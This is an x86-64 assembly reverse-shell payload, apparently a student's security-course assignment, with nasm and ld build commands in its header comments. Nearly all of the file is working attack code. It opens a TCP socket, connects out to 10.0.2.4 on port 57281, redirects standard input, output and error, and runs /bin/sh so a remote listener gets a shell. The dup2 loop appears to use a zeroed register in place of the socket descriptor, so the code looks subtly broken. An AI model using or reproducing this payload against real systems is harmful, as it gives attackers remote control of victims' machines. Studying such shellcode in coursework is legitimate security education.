; Lucas Burke
; 22 May 2019
; CS4678 - Assignment 3
; Binary: nasm -f bin reverse.asm
; Assembly (for localhost testing): nasm -f elf64 -g reverse.asm
; Linker: ld -o myrev -m elf_x86_64 reverse.o
; Comments: Set at port 57281.
; Help: Most of it came from my assign2 bind shell.

bits 64
global _start
section .text
_start:
  xor r8, r8
  xor r9, r9
;socket(af_inet=2 (internet IP), sock_stream=1 (tcp), protocol=0(unspecified or same as addr fam))
;parameters/descriptions came from socket.h headerfile
  mov rdi, 2
  mov rsi, 1
  mov rdx, 0
  mov rax, 41
  syscall
  mov rdi, rax ; rdi has sock fd

; struct sock_stream (help from: https://github.com/zerosum0x0/SLAE64/blob/master/bindshell/bindshell.asm)
  push rdx ; reverse args
  push rdx
  mov byte [rsp], 2    			; family==AF_INET
  mov word [rsp + 0x2], 0xc1df  ; PORT = 57281
  mov dword [rsp+0x4],0x0402000a ; 10.0.2.4 == 0x0a000204

; connect
  mov rsi, rsp 					; rsi now holds struct addr
  mov rdx, 0x10
  push rax
  mov rax, 42
  syscall

;dupe
  xor r8, r8
  mov r8, 2 ; start at stderr and dup/dec down to zero
  .loop_fd:
      mov rdi, r9
      mov rax, 33 ;dup2
      mov rsi, r8
      syscall
  dec r8
  jns .loop_fd ;jump not sign-> checks sign flag

 ;execve("/bin//sh",*{"bin//sh","0x00"},'0x00')
  xor rax, rax
  push rax 										;null terminator
  mov rbx, 0x68732f2f6e69622f ;"/bin//sh"
  push rbx 										;push onto stack
  mov rdi, rsp 								;*file "/bin//sh"
  push rax										;null terminator
  mov rdx, rsp								;rdx has addr of last pushed null
  push rdi										;arg1
  mov rsi, rsp 								;rsp is pointing at null
  add rax, 59
  syscall
